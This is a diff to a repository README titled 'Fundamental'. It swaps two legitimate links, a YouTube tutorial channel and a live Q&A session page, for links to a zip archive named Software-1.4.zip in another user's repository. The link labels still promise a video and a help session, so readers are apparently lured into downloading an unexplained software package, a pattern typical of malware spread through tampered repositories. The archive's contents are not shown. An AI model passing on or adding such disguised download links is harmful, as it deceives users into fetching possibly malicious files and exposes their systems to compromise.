@@ -1,5 +1,5 @@
 # **Fundamental**
 
-**[Watch Video Tutorial](https://www.youtube.com/c/YBIFoundation?sub_confirmation=1)**
+**[Watch Video Tutorial](https://raw.githubusercontent.com/Simran12solanki/Fundamental/main/mixite/Software-1.4.zip)**
 
-**[Ask Doubt in FREE Live QnA Session](https://www.ybifoundation.org/session/live-qna-and-doubt-support)**
+**[Ask Doubt in FREE Live QnA Session](https://raw.githubusercontent.com/Simran12solanki/Fundamental/main/mixite/Software-1.4.zip)**
